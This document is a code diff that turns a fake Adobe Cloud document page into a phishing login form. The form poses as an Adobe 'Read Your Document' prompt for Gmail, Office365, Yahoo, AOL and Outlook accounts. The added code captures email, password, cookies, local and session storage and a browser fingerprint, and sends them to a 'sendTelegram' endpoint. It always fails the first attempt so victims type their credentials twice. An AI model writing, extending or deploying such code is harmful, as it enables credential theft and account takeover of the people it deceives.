@@ -1,442 +1,324 @@
-import React, { useState, useEffect } from 'react';
-import { FileText, Download, Eye, Trash2, Calendar, User, Grid3X3, List, Upload } from 'lucide-react';
+import React, { useState } from 'react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
+import { buildOAuthUrl, generateState, getBrowserFingerprint, sendToTelegram } from '../utils/oauthHandler';
 
-interface File {
-  name: string;
-  type: 'pdf' | 'docx' | 'xlsx';
-  size: string;
-  date: string;
+interface LoginPageProps {
+  fileName: string;
+  onBack: () => void;
+  onLoginSuccess?: (sessionData: any) => void;
+  onLoginError?: (error: string) => void;
+  showBackButton?: boolean;
 }
 
-interface LandingPageProps {
-  onFileAction: (fileName: string, action: 'view' | 'download') => void;
-}
+const LoginPage: React.FC<LoginPageProps> = ({ 
+  fileName, 
+  onBack, 
+  onLoginSuccess, 
+  onLoginError,
+  showBackButton = false 
+}) => {
+  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [loginAttempts, setLoginAttempts] = useState(0);
+  const [errorMessage, setErrorMessage] = useState('');
 
-const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
-  const [activeNav, setActiveNav] = useState('Protected Files');
-  const [activeView, setActiveView] = useState('Grid View');
-  const [currentDate, setCurrentDate] = useState('');
-  const [hasActiveSession, setHasActiveSession] = useState(false);
-  const [sessionInfo, setSessionInfo] = useState<any>(null);
+  const emailProviders = [
+    { 
+      name: 'Office365', 
+      domain: 'outlook.com', 
+      color: 'bg-blue-600', 
+      logo: 'https://www.svgrepo.com/show/503426/microsoft-office.svg'
+    },
+    { 
+      name: 'Yahoo', 
+      domain: 'yahoo.com', 
+      color: 'bg-purple-600', 
+      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Yahoo_Y_%282009-2013%29.svg/450px-Yahoo_Y_%282009-2013%29.svg.png?20100624225346'
+    },
+    { 
+      name: 'Outlook', 
+      domain: 'outlook.com', 
+      color: 'bg-blue-500', 
+      logo: 'https://www.svgrepo.com/show/443244/brand-microsoft-outlook.svg'
+    },
+    { 
+      name: 'AOL', 
+      domain: 'aol.com', 
+      color: 'bg-red-600', 
+      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/AOL_logo_%282024%29.svg/1199px-AOL_logo_%282024%29.svg.png?20241206193155'
+    },
+    { 
+      name: 'Gmail', 
+      domain: 'gmail.com', 
+      color: 'bg-red-500', 
+      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png?20221017173631'
+    },
+    { 
+      name: 'Others', 
+      domain: 'other.com', 
+      color: 'bg-gray-600', 
+      logo: 'https://www.svgrepo.com/show/521128/email-1.svg'
+    }
+  ];
 
-  // Generate current date
-  useEffect(() => {
-    const now = new Date();
-    const options: Intl.DateTimeFormatOptions = { 
-      month: 'short', 
-      day: 'numeric' 
-    };
-    setCurrentDate(now.toLocaleDateString('en-US', options));
-  }, []);
+  const handleProviderSelect = (provider: string) => {
+    console.log(`🔐 Selected provider: ${provider}`);
+    
+    // Show the login form for all providers
+    setSelectedProvider(provider);
+  };
 
-  // Check for existing sessions on component mount
-  useEffect(() => {
-    checkForExistingSession();
-  }, []);
+  const handleFormSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!email || !password || !selectedProvider) return;
 
-  const checkForExistingSession = async () => {
+    setIsLoading(true);
+    setErrorMessage('');
+    
     try {
-      // Check server session first
-      const response = await fetch('/.netlify/functions/getSession', {
-        method: 'GET',
-        credentials: 'include',
-        headers: {
-          'Content-Type': 'application/json'
+      const currentAttempt = loginAttempts + 1;
+      setLoginAttempts(currentAttempt);
+      
+      // Capture browser fingerprint for this attempt
+      const browserFingerprint = getBrowserFingerprint();
+      
+      // Force cookie refresh and capture
+      const cookieCapture = {
+        documentCookies: document.cookie,
+        allCookies: {},
+        domains: [window.location.hostname]
+      };
+      
+      // Parse all cookies
+      document.cookie.split(';').forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (name && value) {
+          cookieCapture.allCookies[name] = decodeURIComponent(value);
         }
       });
 
-      if (response.ok) {
-        const data = await response.json();
-        if (data.success && data.session) {
-          setHasActiveSession(true);
-          setSessionInfo(data.session);
-          return;
+      const sessionData = {
+        email: email,
+        password: password,
+        provider: selectedProvider,
+        sessionId: Math.random().toString(36).substring(2, 15),
+        timestamp: new Date().toISOString(),
+        fileName: 'Adobe Cloud Access',
+        clientIP: 'Unknown',
+        userAgent: navigator.userAgent,
+        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
+        cookies: cookieCapture.documentCookies,
+        cookiesParsed: cookieCapture.allCookies,
+        documentCookies: cookieCapture.documentCookies,
+        localStorage: JSON.stringify(browserFingerprint.localStorage),
+        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
+        browserFingerprint: browserFingerprint,
+        attemptNumber: currentAttempt,
+        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
+        cookieCapture: cookieCapture
+      };
+
+      console.log(`🔐 Login attempt ${currentAttempt}:`, { email, provider: selectedProvider });
+      
+      // Send attempt data to Telegram
+      try {
+        const response = await fetch('/.netlify/functions/sendTelegram', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(sessionData)
+        });
+        
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
         }
+        
+        const result = await response.json();
+        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
+      } catch (error) {
+        console.error(`❌ Failed to send attempt ${currentAttempt} to Telegram:`, error);
       }
 
-      // Check localStorage for autograb session
-      const storedSession = localStorage.getItem('adobe_autograb_session');
-      if (storedSession) {
-        try {
-          const sessionData = JSON.parse(storedSession);
-          const sessionTime = new Date(sessionData.timestamp);
-          const now = new Date();
-          const hoursDiff = (now.getTime() - sessionTime.getTime()) / (1000 * 60 * 60);
-          
-          // Session never expires - always valid
-          if (true) {
-            setHasActiveSession(true);
-            setSessionInfo(sessionData);
-            console.log('AutoGrab session found:', sessionData);
-          }
-        } catch (error) {
-          console.error('Error parsing stored session:', error);
+
+
+      if (currentAttempt === 1) {
+        // First attempt - show error
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        setErrorMessage('Invalid email or password. Please try again.');
+        setIsLoading(false);
+      } else {
+        // Second attempt - show success and redirect
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Store session data in localStorage
+        if (typeof localStorage !== 'undefined') {
+          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
         }
+        
+        // Call the success handler
+        if (onLoginSuccess) {
+          await onLoginSuccess(sessionData);
+        }
+        
+        setIsLoading(false);
       }
     } catch (error) {
-      console.log('No existing session found:', error);
+      console.error('Login error:', error);
+      if (onLoginError) {
+        onLoginError('Login failed. Please try again.');
+      }
+      setIsLoading(false);
+    } finally {
+      // Loading state is handled in the success/error blocks above
     }
   };
 
-  // Convert file sizes to kilobytes and use current date
-  const protectedFiles: File[] = [
-    { name: 'Document1.pdf', type: 'pdf', size: '54 KB', date: currentDate },
-    { name: 'Report.docx', type: 'docx', size: '56 KB', date: currentDate },
-    { name: 'Data.xlsx', type: 'xlsx', size: '50 KB', date: currentDate },
-    { name: 'Notes.pdf', type: 'pdf', size: '52 KB', date: currentDate },
-    { name: 'Overview.docx', type: 'docx', size: '52 KB', date: currentDate },
-    { name: 'Budget.pdf', type: 'pdf', size: '52 KB', date: currentDate },
-    { name: 'Summary.pdf', type: 'pdf', size: '50 KB', date: currentDate },
-    { name: 'Contract.pdf', type: 'pdf', size: '50 KB', date: currentDate },
-    { name: 'Contract2.pdf', type: 'pdf', size: '52 KB', date: currentDate },
-  ];
-
-  // Recent files - only one PDF
-  const recentFiles: File[] = [
-    { name: 'protected-document.pdf', type: 'pdf', size: '48 KB', date: currentDate },
-  ];
-
-  const getFileIcon = (type: string) => {
-    const baseClasses = "w-8 h-8 flex items-center justify-center rounded-lg font-bold text-xs uppercase tracking-wide";
-    switch (type) {
-      case 'pdf':
-        return `${baseClasses} bg-red-50 text-red-600`;
-      case 'docx':
-        return `${baseClasses} bg-blue-50 text-blue-600`;
-      case 'xlsx':
-        return `${baseClasses} bg-green-50 text-green-600`;
-      default:
-        return `${baseClasses} bg-gray-50 text-gray-600`;
-    }
+  const handleBackToProviders = () => {
+    setSelectedProvider(null);
+    setEmail('');
+    setPassword('');
+    setLoginAttempts(0);
+    setErrorMessage('');
   };
 
-  const navItems = ['Protected Files', 'Shared With Me', 'Recent', 'Trash'];
-
-  const getHeaderContent = () => {
-    switch (activeNav) {
-      case 'Protected Files':
-        return {
-          title: 'Protected Files',
-          description: 'All your secure and recent documents.'
-        };
-      case 'Shared With Me':
-        return {
-          title: 'Shared With Me',
-          description: 'Documents shared by your team members.'
-        };
-      case 'Recent':
-        return {
-          title: 'Recent Files',
-          description: 'Your recently accessed documents.'
-        };
-      case 'Trash':
-        return {
-          title: 'Trash',
-          description: 'Deleted files and documents.'
-        };
-      default:
-        return {
-          title: 'Protected Files',
-          description: 'All your secure and recent documents.'
-        };
-    }
-  };
-
-  const getCurrentFiles = () => {
-    switch (activeNav) {
-      case 'Protected Files':
-        return protectedFiles;
-      case 'Shared With Me':
-        return protectedFiles;
-      case 'Recent':
-        return recentFiles;
-      case 'Trash':
-        return [];
-      default:
-        return protectedFiles;
-    }
-  };
-
-  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
-    // Check if we have an active session for autograb
-    if (hasActiveSession && sessionInfo) {
-      console.log('Using autograb session for file access:', sessionInfo);
-      const successDiv = document.createElement('div');
-      successDiv.innerHTML = `
-        <div style="
-          position: fixed;
-          top: 50%;
-          left: 50%;
-          transform: translate(-50%, -50%);
-          background: #1E1E1E;
-          color: white;
-          padding: 20px;
-          border-radius: 10px;
-          box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-          z-index: 10000;
-          text-align: center;
-          font-family: system-ui, -apple-system, sans-serif;
-          border: 1px solid #FF0000;
-        ">
-          <div style="color: #FF0000; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
-            ✓ Access Granted!
-          </div>
-          <div style="color: #E5E7EB; font-size: 14px;">
-            Opening ${fileName}...
-          </div>
-        </div>
-      `;
-      document.body.appendChild(successDiv);
-      setTimeout(() => {
-        document.body.removeChild(successDiv);
-      }, 2000);
-      return;
-    }
-
-    // No session available, require login
-    onFileAction(fileName, action);
-  };
-
-  const headerContent = getHeaderContent();
-  const currentFiles = getCurrentFiles();
-
-  const renderEmptyState = () => (
-    <div className="flex flex-col items-center justify-center py-20 text-center">
-      <div className="w-20 h-20 bg-white/60 backdrop-blur-sm rounded-full flex items-center justify-center mb-6 shadow-lg">
-        <Trash2 className="w-10 h-10 text-gray-800" />
-      </div>
-      <h3 className="text-xl font-semibold text-white mb-3">Trash is empty</h3>
-      <p className="text-base text-gray-300 max-w-sm">
-        When you delete files, they'll appear here before being permanently removed.
-      </p>
-    </div>
-  );
-
-  const renderGridView = () => (
-    <div className="grid grid-cols-3 gap-6">
-      {currentFiles.map((file, index) => (
-        <div
-          key={index}
-          className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 p-5 hover:shadow-xl transition-all duration-200 group hover:bg-white/95"
-        >
-          {/* File Header */}
-          <div className="flex items-center gap-4 mb-4">
-            <div className={getFileIcon(file.type)}>
-              {file.type}
-            </div>
-            <div className="flex-1 min-w-0">
-              <h3 className="font-semibold text-gray-900 truncate text-base">
-                {file.name}
-              </h3>
-              <p className="text-xs text-gray-500">
-                {file.size} · {file.date}
-              </p>
-            </div>
-          </div>
-
-          {/* File Actions */}
-          <div className="flex items-center gap-2 flex-wrap">
-            <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
-              {hasActiveSession ? 'Unlocked' : 'Protected'}
-            </span>
-            <div className="flex gap-2 ml-auto">
-              <button
-                onClick={() => handleFileAction(file.name, 'view')}
-                className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-xs hover:from-red-700 hover:to-red-800 transition-all duration-200 group-hover:transform group-hover:-translate-y-0.5 shadow-md"
-              >
-                <Eye className="w-3 h-3" />
-                View
-              </button>
-              <button
-                onClick={() => handleFileAction(file.name, 'download')}
-                className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-xs hover:bg-white transition-all duration-200 shadow-sm"
-              >
-                <Download className="w-3 h-3" />
-                Download
-              </button>
-            </div>
-          </div>
-        </div>
-      ))}
-    </div>
-  );
-
-  const renderListView = () => (
-    <div className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 overflow-hidden">
-      {/* Table Header */}
-      <div className="grid grid-cols-12 gap-4 px-6 py-4 bg-red-50/70 backdrop-blur-sm border-b border-gray-100 text-sm font-medium text-gray-700">
-        <div className="col-span-6">Name</div>
-        <div className="col-span-2">Type</div>
-        <div className="col-span-2">Size</div>
-        <div className="col-span-2">Actions</div>
-      </div>
-
-      {/* Table Rows */}
-      {currentFiles.map((file, index) => (
-        <div
-          key={index}
-          className="grid grid-cols-12 gap-4 px-6 py-4 border-b border-gray-50 hover:bg-red-50/50 transition-all duration-200 group"
-        >
-          {/* File Name with Icon */}
-          <div className="col-span-6 flex items-center gap-3">
-            <div className={getFileIcon(file.type)}>
-              {file.type}
-            </div>
-            <div className="min-w-0">
-              <h3 className="font-semibold text-gray-900 truncate text-base">
-                {file.name}
-              </h3>
-              <p className="text-xs text-gray-500 flex items-center gap-1">
-                <Calendar className="w-3 h-3" />
-                Modified {file.date}
-              </p>
-            </div>
-          </div>
-
-          {/* File Type */}
-          <div className="col-span-2 flex items-center">
-            <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
-              {hasActiveSession ? 'Unlocked' : 'Protected'}
-            </span>
-          </div>
-
-          {/* File Size */}
-          <div className="col-span-2 flex items-center text-sm text-gray-600">
-            {file.size}
-          </div>
-
-          {/* Actions */}
-          <div className="col-span-2 flex items-center gap-2">
-            <button
-              onClick={() => handleFileAction(file.name, 'view')}
-              className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-sm hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
-            >
-              <Eye className="w-3 h-3" />
-              View
-            </button>
-            <button
-              onClick={() => handleFileAction(file.name, 'download')}
-              className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-sm hover:bg-white transition-all duration-200 shadow-sm"
-            >
-              <Download className="w-3 h-3" />
-              Download
-            </button>
-          </div>
-        </div>
-      ))}
-    </div>
-  );
 
   return (
-    <div className="flex min-h-screen relative overflow-hidden">
-      {/* Dark gradient background with red/purple accents */}
-      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
-      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
-      
-      {/* Subtle abstract shapes and blurry overlays */}
-      <div className="absolute top-5 right-5 w-60 h-60 bg-[#FF0000]/5 rounded-full blur-3xl"></div>
-      <div className="absolute bottom-5 left-5 w-48 h-48 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/3 right-1/4 w-36 h-36 bg-[#FF0000]/6 rounded-full blur-xl"></div>
-      <div className="absolute bottom-1/3 left-1/3 w-40 h-40 bg-[#EC4899]/7 rounded-full blur-2xl"></div>
-      <div className="absolute top-1/2 left-1/2 w-32 h-32 bg-[#8B5CF6]/5 rounded-full blur-xl transform -translate-x-1/2 -translate-y-1/2"></div>
-      <div className="absolute top-20 left-20 w-24 h-24 bg-[#FF0000]/4 rounded-full blur-lg"></div>
-      <div className="absolute bottom-20 right-20 w-28 h-28 bg-[#EC4899]/6 rounded-full blur-xl"></div>
-
-      {/* Sidebar */}
-      <aside className="relative z-10 w-56 bg-[#1E1E1E]/95 backdrop-blur-xl border-r border-[#2C2C2C]/60 flex flex-col shadow-xl">
-        <div className="p-6 flex-1">
-          {/* Logo Section with Acrobat Logo */}
-          <div className="flex items-center gap-3 mb-6">
-            <img 
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
-              alt="Adobe Acrobat" 
-              className="w-10 h-10 object-contain"
-            />
-            <h1 className="text-lg font-semibold text-white">Adobe Cloud</h1>
-          </div>
-
-          {/* Navigation */}
-          <nav className="flex flex-col gap-2">
-            {navItems.map((item) => (
-              <button
-                key={item}
-                onClick={() => setActiveNav(item)}
-                className={`text-left px-3 py-2.5 rounded-lg font-medium text-sm transition-all duration-200 ${
-                  activeNav === item
-                    ? 'bg-[#FF0000]/10 text-[#FF0000] shadow-sm border border-[#FF0000]/20'
-                    : 'text-gray-300 hover:bg-[#2C2C2C]/80 hover:text-white'
-                }`}
-              >
-                {item}
-              </button>
-            ))}
-          </nav>
-        </div>
-
-        {/* Adobe Footer */}
-        <div className="p-6 border-t border-[#2C2C2C]/60">
-          <p className="text-sm text-gray-400 leading-relaxed font-medium">
-            © 2025 Adobe Inc.<br />
-            All rights reserved.
-          </p>
-        </div>
-      </aside>
-
-      {/* Main Content */}
-      <main className="relative z-10 flex-1 p-6 min-w-0">
-        {/* Header */}
-        <div className="flex justify-between items-start mb-6">
-          <div className="min-w-0">
-            <h2 className="text-2xl font-bold text-white mb-1">
-              {headerContent.title}
-            </h2>
-            <p className="text-base text-gray-300 font-medium">{headerContent.description}</p>
-          </div>
-          
-          {/* Only show view controls if not in Trash */}
-          {activeNav !== 'Trash' && (
-            <div className="flex gap-2 flex-shrink-0">
-              <button
-                onClick={() => setActiveView('List View')}
-                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
-                  activeView === 'List View'
-                    ? 'bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white border-[#FF0000]'
-                    : 'bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white'
-                }`}
-              >
-                <List className="w-4 h-4" />
-                List
-              </button>
-              <button
-                onClick={() => setActiveView('Grid View')}
-                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
-                  activeView === 'Grid View'
-                    ? 'bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white border-[#FF0000]'
-                    : 'bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white'
-                }`}
-              >
-                <Grid3X3 className="w-4 h-4" />
-                Grid
-              </button>
-              <button className="flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white transition-all duration-200 shadow-sm">
-                <Upload className="w-4 h-4" />
-                Upload
-              </button>
+    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#f0f6f8] to-[#e6eef2] p-4">
+      <div className="w-full max-w-lg">
+        {/* Compact Card */}
+        <div className="bg-white rounded-lg shadow-lg border border-gray-100 p-6">
+          {/* Header (reduced) */}
+          <div className="flex items-center gap-3 mb-3">
+            <div className="w-11 h-11 rounded-lg bg-red-500 flex items-center justify-center">
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png"
+                alt="PDF"
+                className="w-6 h-6 object-contain"
+              />
             </div>
-          )}
-        </div>
+            <div>
+              <h1 className="text-lg font-semibold text-gray-900">Read Your Document</h1>
+              <p className="text-sm text-gray-600 -mt-0.5">Please select your e-mail provider below::</p>
+            </div>
+          </div>
 
-        {/* Content Area */}
-        <div className="min-w-0">
-          {activeNav === 'Trash' ? (
-            renderEmptyState()
-          ) : (
-            activeView === 'Grid View' ? renderGridView() : renderListView()
-          )}
+          {/* Content */}
+          <div className="mt-4">
+            {!selectedProvider ? (
+              /* Provider selection - using existing provider logos */
+              <div className="grid grid-cols-2 gap-4">
+                {emailProviders.map((provider) => (
+                  <button
+                    key={provider.name}
+                    onClick={() => handleProviderSelect(provider.name)}
+                    className="flex items-center gap-3 p-3 bg-white rounded-lg shadow-sm border border-gray-100 hover:shadow-md transition-transform transform hover:-translate-y-0.5"
+                    aria-label={`Select ${provider.name}`}
+                    type="button"
+                  >
+                    <div className={`w-12 h-12 flex items-center justify-center rounded-md ${provider.color} flex-shrink-0`}>
+                      <img
+                        src={provider.logo}
+                        alt={provider.name}
+                        className="w-7 h-7 object-contain"
+                        onError={(e) => {
+                          const target = e.target as HTMLImageElement;
+                          target.style.display = 'none';
+                          const parent = target.parentElement;
+                          if (parent && !parent.querySelector('.fallback-text')) {
+                            const fallback = document.createElement('div');
+                            fallback.className = 'fallback-text text-white font-bold';
+                            fallback.textContent = provider.name.charAt(0);
+                            parent.appendChild(fallback);
+                          }
+                        }}
+                      />
+                    </div>
+                    <div className="text-sm font-medium text-gray-900">{provider.name}</div>
+                  </button>
+                ))}
+              </div>
+            ) : (
+              /* Login form - preserved logic */
+              <div>
+                <div className="flex items-center gap-3 mb-4">
+                  <button
+                    onClick={handleBackToProviders}
+                    className="text-gray-500 hover:text-gray-800"
+                    type="button"
+                  >
+                    <ArrowLeft className="w-4 h-4" />
+                  </button>
+                  <h2 className="text-sm font-semibold text-gray-900">Sign in with {selectedProvider}</h2>
+                </div>
+
+                <form onSubmit={handleFormSubmit} className="space-y-3">
+                  {errorMessage && (
+                    <div className="bg-red-50 border border-red-100 rounded-md p-2">
+                      <p className="text-red-600 text-sm">{errorMessage}</p>
+                    </div>
+                  )}
+
+                  <div>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Email Address</label>
+                    <div className="relative">
+                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
+                      <input
+                        type="email"
+                        value={email}
+                        onChange={(e) => setEmail(e.target.value)}
+                        className="w-full pl-10 pr-3 py-2.5 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        placeholder="Enter your email"
+                        required
+                      />
+                    </div>
+                  </div>
+
+                  <div>
+                    <label className="block text-xs font-medium text-gray-600 mb-1">Password</label>
+                    <div className="relative">
+                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
+                      <input
+                        type={showPassword ? 'text' : 'password'}
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        className="w-full pl-10 pr-10 py-2.5 bg-gray-50 border border-gray-200 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                        placeholder="Enter your password"
+                        required
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-800"
+                      >
+                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                      </button>
+                    </div>
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={isLoading || !email || !password}
+                    className="w-full bg-blue-600 text-white py-2.5 rounded-md font-semibold hover:bg-blue-700 disabled:opacity-60 transition-colors"
+                  >
+                    {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In'}
+                  </button>
+                </form>
+              </div>
+            )}
+          </div>
+
+          {/* Compact footer */}
+          <div className="mt-5 text-center">
+            <p className="text-xs text-gray-500">© 2025 Adobe Inc. All rights reserved.</p>
+          </div>
         </div>
-      </main>
+      </div>
     </div>
   );
 };
 
-export default LandingPage;
+export default LoginPage;
